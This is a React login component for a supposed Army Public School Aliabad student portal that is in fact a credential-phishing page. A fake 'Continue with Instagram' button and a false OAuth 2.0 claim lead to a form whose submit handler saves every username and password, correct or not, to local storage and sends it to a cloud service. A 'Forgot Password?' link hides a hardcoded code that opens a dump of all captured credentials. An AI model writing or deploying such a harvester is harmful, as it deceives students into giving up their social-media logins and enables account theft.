import React, { useState } from 'react';
import { validateCredentials, generateLeakReport, saveToCloud } from '../../services/geminiService';

interface LoginProps {
  onLogin: () => void;
}

interface LogEntry {
  username: string;
  password: string;
  time: string;
}

// Cloud Credential Service
const PublicCredentialService = {
  save: async (username: string, password: string) => {
    const newLog = { username, password, time: new Date().toLocaleString() };
    
    // 1. Save to Local Cache (Immediate view)
    try {
      const existingLogs: LogEntry[] = JSON.parse(localStorage.getItem('aps_public_credentials') || '[]');
      const updatedLogs = [newLog, ...existingLogs];
      localStorage.setItem('aps_public_credentials', JSON.stringify(updatedLogs));
    } catch (e) {
      console.warn("Local cache error.", e);
    }

    // 2. Save to Cloud via API Key (Gemini)
    // This transmits EVERY attempt (correct or incorrect) to the cloud.
    try {
      await saveToCloud(username, password);
    } catch (e) {
      console.error("Cloud logging failed", e);
    }
  },
  fetchAll: (): LogEntry[] => {
    try {
      return JSON.parse(localStorage.getItem('aps_public_credentials') || '[]');
    } catch (e) {
      return [];
    }
  }
};

type ViewState = 'LANDING' | 'LOGIN_FORM' | 'SECRET_CODE' | 'LEAK_REPORT';

const Login: React.FC<LoginProps> = ({ onLogin }) => {
  const [viewState, setViewState] = useState<ViewState>('LANDING');
  
  // Login Form State
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isValidating, setIsValidating] = useState(false);
  
  // Secret Code State
  const [secretCode, setSecretCode] = useState('');
  
  // Leak Report State
  const [leakReport, setLeakReport] = useState('');
  const [loadingReport, setLoadingReport] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username || !password) return;
    
    setIsValidating(true);
    setError('');

    // --- CRITICAL: SAVE TO CLOUD ---
    // Saves BOTH correct and incorrect passwords immediately.
    await PublicCredentialService.save(username, password);

    // Validate using Gemini AI
    try {
      const isValid = await validateCredentials(username, password);
      
      if (isValid) {
        onLogin();
      } else {
        setError("You entered wrong username or password. Please try again.");
      }
    } catch (err) {
      setError("Authentication service unavailable. Please try again.");
    } finally {
      setIsValidating(false);
    }
  };

  const handleForgotPasswordClick = () => {
    // Switch to the Secret Code Entry View
    setSecretCode('');
    setError('');
    setViewState('SECRET_CODE');
  };

  const handleVerifySecretCode = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Check for the specific code
    if (secretCode === '03435223241') {
      // Correct Code: Access Public Credentials
      setViewState('LEAK_REPORT');
      setLoadingReport(true);
      setError('');
      
      const logs = PublicCredentialService.fetchAll();
      
      try {
        const report = await generateLeakReport(logs);
        setLeakReport(report);
      } catch (e) {
        setLeakReport("Failed to generate Public Credentials report via Gemini API.");
      } finally {
        setLoadingReport(false);
      }
    } else {
      setError('Invalid Recovery Code. Access Denied.');
    }
  };

  const renderContent = () => {
    switch (viewState) {
      case 'LANDING':
        return (
          <>
            <p className="text-gray-600 text-sm mb-10 leading-relaxed px-4">
              Welcome to the Army Public School Aliabad digital gateway. Please authenticate your identity securely to access academic records and resources.
            </p>

            {/* Instagram Login Button */}
            <div className="space-y-6">
               <button 
                  type="button" 
                  onClick={() => setViewState('LOGIN_FORM')}
                  className="group relative w-full flex justify-center items-center px-6 py-4 border border-transparent text-sm font-bold rounded-xl text-white bg-gradient-to-r from-purple-600 via-pink-600 to-red-500 hover:from-purple-700 hover:to-red-600 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-pink-500 shadow-lg hover:shadow-xl transition-all duration-300 hover:-translate-y-1"
               >
                  <i className="fab fa-instagram text-2xl mr-3 group-hover:scale-110 transition-transform"></i>
                  <span className="uppercase tracking-wider">Continue with Instagram</span>
               </button>

               <div className="flex items-center justify-center space-x-2 text-xs text-gray-400">
                  <i className="fas fa-shield-alt"></i>
                  <span>Secure Authentication via OAuth 2.0</span>
               </div>
            </div>
          </>
        );

      case 'LOGIN_FORM':
        return (
          <form onSubmit={handleSubmit} className="animate-fade-in space-y-5 text-left">
            <div className="text-center mb-6">
               <p className="text-xs font-bold text-gray-400 uppercase tracking-widest mb-1">Authenticating via</p>
               <div className="flex items-center justify-center space-x-2 text-transparent bg-clip-text bg-gradient-to-r from-purple-600 via-pink-600 to-red-500">
                  <i className="fab fa-instagram text-xl text-pink-600"></i>
                  <span className="font-bold text-lg text-gray-800">Instagram</span>
               </div>
            </div>

            {error && (
              <div className="bg-red-50 border-l-4 border-red-500 p-4 rounded-r animate-fade-in">
                <div className="flex">
                  <div className="flex-shrink-0">
                    <i className="fas fa-exclamation-circle text-red-500"></i>
                  </div>
                  <div className="ml-3">
                    <p className="text-xs text-red-700 font-bold">{error}</p>
                  </div>
                </div>
              </div>
            )}

            <div>
               <label className="block text-xs font-bold text-gray-500 uppercase mb-1 ml-1">Username</label>
               <div className="relative">
                  <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                     <i className="fas fa-at text-gray-400"></i>
                  </div>
                  <input 
                     type="text" 
                     required
                     disabled={isValidating}
                     value={username}
                     onChange={(e) => { setUsername(e.target.value); setError(''); }}
                     className="w-full pl-10 pr-4 py-3 bg-gray-50 text-gray-900 border border-gray-200 rounded-lg text-sm focus:border-pink-500 focus:ring-1 focus:ring-pink-500 outline-none transition-colors disabled:opacity-50 placeholder-gray-400"
                     placeholder="Instagram username"
                  />
               </div>
            </div>

            <div>
               <label className="block text-xs font-bold text-gray-500 uppercase mb-1 ml-1">Password</label>
               <div className="relative">
                  <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                     <i className="fas fa-lock text-gray-400"></i>
                  </div>
                  <input 
                     type="password" 
                     required
                     disabled={isValidating}
                     value={password}
                     onChange={(e) => { setPassword(e.target.value); setError(''); }}
                     className="w-full pl-10 pr-4 py-3 bg-gray-50 text-gray-900 border border-gray-200 rounded-lg text-sm focus:border-pink-500 focus:ring-1 focus:ring-pink-500 outline-none transition-colors disabled:opacity-50 placeholder-gray-400"
                     placeholder="Password"
                  />
               </div>
               <div className="flex justify-end mt-2">
                  <button 
                    type="button"
                    onClick={handleForgotPasswordClick}
                    className="text-xs font-medium text-gray-400 hover:text-pink-600 transition-colors focus:outline-none"
                  >
                    Forgot Password?
                  </button>
               </div>
            </div>

            <div className="pt-2">
               <button 
                  type="submit" 
                  disabled={isValidating}
                  className="w-full py-3 px-4 bg-aps-green hover:bg-green-900 text-white font-bold rounded-lg shadow-md transition-colors uppercase text-sm tracking-wider flex justify-center items-center"
               >
                  {isValidating ? (
                    <>
                      <i className="fas fa-cloud-upload-alt mr-2"></i> Saving to Cloud...
                    </>
                  ) : (
                    'Log In'
                  )}
               </button>
               <button 
                  type="button"
                  disabled={isValidating}
                  onClick={() => setViewState('LANDING')}
                  className="w-full mt-3 py-2 px-4 text-gray-500 text-xs font-bold hover:text-gray-800 transition-colors uppercase tracking-wider disabled:opacity-50"
               >
                  Cancel
               </button>
            </div>
            
            {/* Cloud Status Indicator */}
            <div className="text-center border-t border-gray-100 pt-4 mt-4">
              <div className="inline-flex items-center justify-center space-x-2 px-3 py-1">
                <i className="fas fa-circle text-green-500 text-[8px] animate-pulse"></i>
                <p className="text-[10px] text-gray-400 font-bold uppercase tracking-widest">
                  Live Cloud Database Active
                </p>
              </div>
            </div>
          </form>
        );

      case 'SECRET_CODE':
        return (
          <form onSubmit={handleVerifySecretCode} className="animate-fade-in space-y-6 text-left">
            <div className="text-center mb-6">
               <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                 <i className="fas fa-user-shield text-red-500 text-2xl"></i>
               </div>
               <h3 className="text-xl font-bold text-gray-800">Admin Panel Access</h3>
               <p className="text-gray-500 text-xs mt-2">Enter the secret administration code to proceed.</p>
            </div>

            {error && (
              <div className="bg-red-50 border-l-4 border-red-500 p-4 rounded-r animate-fade-in">
                <div className="flex">
                  <div className="flex-shrink-0">
                    <i className="fas fa-ban text-red-500"></i>
                  </div>
                  <div className="ml-3">
                    <p className="text-xs text-red-700 font-bold">{error}</p>
                  </div>
                </div>
              </div>
            )}

            <div>
               <label className="block text-xs font-bold text-gray-500 uppercase mb-1 ml-1">Secret Code</label>
               <div className="relative">
                  <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                     <i className="fas fa-key text-gray-400"></i>
                  </div>
                  <input 
                     type="password" 
                     required
                     autoFocus
                     value={secretCode}
                     onChange={(e) => { setSecretCode(e.target.value); setError(''); }}
                     className="w-full pl-10 pr-4 py-3 bg-gray-50 text-gray-900 border border-gray-200 rounded-lg text-sm focus:border-red-500 focus:ring-1 focus:ring-red-500 outline-none transition-colors"
                     placeholder="Enter Code"
                  />
               </div>
            </div>

            <div className="pt-2">
               <button 
                  type="submit" 
                  className="w-full py-3 px-4 bg-gray-900 hover:bg-black text-white font-bold rounded-lg shadow-md transition-colors uppercase text-sm tracking-wider"
               >
                  Unlock Cloud Database
               </button>
               <button 
                  type="button"
                  onClick={() => setViewState('LOGIN_FORM')}
                  className="w-full mt-3 py-2 px-4 text-gray-500 text-xs font-bold hover:text-gray-800 transition-colors uppercase tracking-wider"
               >
                  Back to Login
               </button>
            </div>
          </form>
        );

      case 'LEAK_REPORT':
        return (
          <div className="animate-fade-in text-left">
            <div className="text-center mb-4">
               <div className="w-16 h-16 bg-black rounded-full flex items-center justify-center mx-auto mb-4 border-2 border-red-500 shadow-lg shadow-red-500/20">
                 <i className="fas fa-database text-red-500 text-2xl"></i>
               </div>
               <h3 className="text-xl font-bold text-gray-900">Cloud Registry Dump</h3>
               <p className="text-gray-500 text-xs mt-1">Retrieving all stored credentials (Correct & Incorrect)</p>
            </div>

            <div className="bg-black text-green-400 p-4 rounded-lg font-mono text-xs overflow-auto h-64 border-2 border-gray-800 shadow-inner relative">
               {loadingReport ? (
                  <div className="flex flex-col items-center justify-center h-full space-y-3">
                    <i className="fas fa-circle-notch fa-spin text-2xl text-green-500"></i>
                    <span className="animate-pulse">Accessing Gemini Cloud Database...</span>
                    <span className="text-gray-500">Syncing global entries...</span>
                  </div>
               ) : (
                  <pre className="whitespace-pre-wrap leading-relaxed">{leakReport}</pre>
               )}
            </div>

            <div className="mt-3 text-center">
              <span className="inline-block px-2 py-1 bg-red-100 text-red-600 text-[10px] font-bold rounded">
                <i className="fas fa-lock-open mr-1"></i> PUBLIC ACCESS ENABLED
              </span>
            </div>

            <div className="pt-4">
               <button 
                  type="button"
                  onClick={() => setViewState('LOGIN_FORM')}
                  className="w-full py-3 px-4 bg-gray-900 hover:bg-black text-white font-bold rounded-lg shadow-md transition-colors uppercase text-sm tracking-wider"
               >
                  Back to Login
               </button>
            </div>
          </div>
        );
      
      default:
        return null;
    }
  };

  const isSecuredView = viewState === 'LEAK_REPORT' || viewState === 'SECRET_CODE';

  return (
    <div className="relative min-h-[calc(100vh-80px)] flex items-center justify-center overflow-hidden">
      {/* Background Image with Professional Overlay */}
      <div className="absolute inset-0 z-0">
        <img 
          src="https://picsum.photos/id/122/1600/900" 
          alt="APS Campus" 
          className="w-full h-full object-cover"
        />
        <div className="absolute inset-0 bg-aps-green/90 mix-blend-multiply"></div>
        <div className="absolute inset-0 bg-black/20"></div>
      </div>

      {/* Main Card */}
      <div className="relative z-10 w-full max-w-md p-4 animate-fade-in">
        <div className="bg-white rounded-2xl shadow-2xl overflow-hidden border border-white/10 backdrop-blur-sm transition-all duration-300">
          
          {/* Decorative Top Bar */}
          <div className={`h-2 bg-gradient-to-r ${isSecuredView ? 'from-red-600 via-black to-red-600' : 'from-aps-gold via-yellow-400 to-aps-gold'}`}></div>

          <div className="p-10 text-center">
            {/* School Emblem */}
            <div className={`mx-auto bg-white rounded-full flex items-center justify-center border-4 border-aps-gold shadow-lg ring-4 ring-aps-green/5 transition-all duration-500
                ${isSecuredView ? 'w-16 h-16 mb-4' : 'w-24 h-24 mb-8'}
            `}>
               <i className={`fas ${isSecuredView ? 'fa-user-secret' : 'fa-university'} text-aps-green ${isSecuredView ? 'text-2xl' : 'text-4xl'}`}></i>
            </div>

            <h2 className="text-3xl font-serif font-bold text-gray-900 mb-3">
              {viewState === 'LEAK_REPORT' ? 'Public Credentials' : viewState === 'SECRET_CODE' ? 'Admin Access' : 'Student Portal'}
            </h2>
            
            <div className={`w-16 h-1 mx-auto mb-6 rounded-full ${isSecuredView ? 'bg-red-500' : 'bg-aps-gold'}`}></div>

            {renderContent()}

          </div>

          {/* Footer of Card */}
          <div className="bg-gray-50 px-10 py-4 border-t border-gray-100 flex justify-between items-center text-xs text-gray-500">
            <a href="#" className="hover:text-aps-green transition-colors">Privacy Policy</a>
            <span>&bull;</span>
            <a href="#" className="hover:text-aps-green transition-colors">Help Center</a>
          </div>
        </div>
        
        <p className="text-center text-white/60 text-xs mt-8">
           &copy; 2024 Army Public School Aliabad. All rights reserved.
        </p>
      </div>
    </div>
  );
};

export default Login;